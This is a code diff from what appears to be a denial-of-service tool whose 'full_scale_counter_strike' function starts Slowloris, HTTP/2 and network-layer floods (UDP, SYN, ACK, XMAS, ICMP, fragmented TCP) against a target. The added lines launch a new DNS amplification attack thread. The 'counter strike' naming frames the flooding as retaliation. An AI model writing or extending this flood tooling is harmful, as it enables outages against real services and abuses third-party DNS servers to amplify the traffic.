@@ -367,7 +367,11 @@ def full_scale_counter_strike(target, use_proxy, network_interface):
         f"Slowloris sockets, and {params['h2_threads']} H2 connections.")
 
     # --- Launch Network Layer Floods (L3/L4) ---
-    print("[+] Preparing L3/L4 vectors (UDP, SYN, ACK, XMAS, ICMP, TCP Frag)...")
+    print("[+] Preparing L3/L4 vectors (UDP, SYN, ACK, XMAS, ICMP, TCP Frag, DNS Amp)...")
+    # NEW: DNS Amplification Attack
+    args = (target, params["duration"], stop_event, pause_event, params["threads"], network_interface)
+    attack_threads.append(launch_attack_thread(counter_strike_helper.attack_dns_amplification, args))
+
     for port in [53, 123]:  # UDP
         args = ("UDP-Mix", target, port, params["duration"], stop_event, pause_event, params["threads"])
         attack_threads.append(launch_attack_thread(counter_strike_helper.attack_udp, args))
